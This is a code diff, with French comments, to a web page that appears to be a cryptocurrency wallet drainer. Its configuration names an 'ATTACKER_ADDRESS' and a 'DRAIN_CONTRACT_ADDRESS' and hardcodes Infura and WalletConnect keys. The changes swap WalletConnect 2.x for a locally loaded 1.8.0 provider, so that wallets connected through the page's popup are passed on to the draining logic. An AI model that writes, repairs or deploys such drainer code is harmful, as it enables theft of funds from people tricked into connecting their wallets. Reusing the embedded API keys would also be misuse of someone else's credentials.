@@ -8,9 +8,8 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <!-- Ajout d'Eruda pour le débogage sur mobile (temporaire) -->
-    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-    <script>eruda.init();</script>
+    <!-- Charger WalletConnect 1.8.0 localement -->
+    <script src="/frontend/lib/index.umd.js"></script>
     <style>
         /* Styles pour le popup et l'overlay */
         .wallet-popup {
@@ -214,7 +213,7 @@
             ETH_PRICE_USD: 2000,
             ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754',
             DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963', // Adresse correcte pour Sepolia
-            WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d', // Remplace par ton Project ID WalletConnect
+            WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d', // Non utilisé dans WalletConnect 1.8.0
             INFURA_API_KEY: '0c56a36ee5ff4b72b18abdf5fa241dbd' // Clé Infura fournie
         };
 
@@ -292,6 +291,12 @@
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             const walletListContainer = document.getElementById('walletList');
 
+            // Vérifier si window.WalletConnectProvider est défini
+            console.log('Vérification de window.WalletConnectProvider :', window.WalletConnectProvider);
+            if (!window.WalletConnectProvider) {
+                throw new Error('WalletConnectProvider n\'est pas défini. Vérifiez que la bibliothèque WalletConnect est correctement chargée.');
+            }
+
             // Liste des wallets supportés (on se concentre sur Ethereum pour l'instant)
             const supportedWallets = [
                 {
@@ -326,27 +331,19 @@
                     walletListContainer.classList.add('hidden');
 
                     try {
-                        // Importer WalletConnect dynamiquement
-                        console.log('Tentative d\'importation dynamique de WalletConnect...');
-                        const { EthereumProvider } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.0/dist/index.es.js');
-                        console.log('EthereumProvider importé :', EthereumProvider);
-
-                        // Initialiser WalletConnect
+                        // Initialiser WalletConnect (version 1.8.0)
                         console.log('Initialisation de WalletConnect...');
-                        const provider = await EthereumProvider.init({
-                            projectId: CONFIG.WALLET_CONNECT_PROJECT_ID,
-                            chains: [11155111], // Sepolia
-                            showQrModal: false, // Désactiver le QR code
-                            methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
-                            events: ['chainChanged', 'accountsChanged'],
-                            rpcMap: {
+                        const provider = new window.WalletConnectProvider({
+                            infuraId: CONFIG.INFURA_API_KEY, // Utiliser Infura pour la version 1.x
+                            chainId: 11155111, // Sepolia
+                            rpc: {
                                 11155111: `https://sepolia.infura.io/v3/${CONFIG.INFURA_API_KEY}`
                             }
                         });
 
-                        // Connecter via WalletConnect
+                        // Activer le provider (équivalent à .connect() dans la version 2.x)
                         console.log('Connexion via WalletConnect...');
-                        await provider.connect();
+                        await provider.enable();
                         const web3Provider = new window.ethers.providers.Web3Provider(provider);
 
                         const success = await handleWalletConnection({ type: wallet.type, provider: web3Provider, name: wallet.name }, elements);
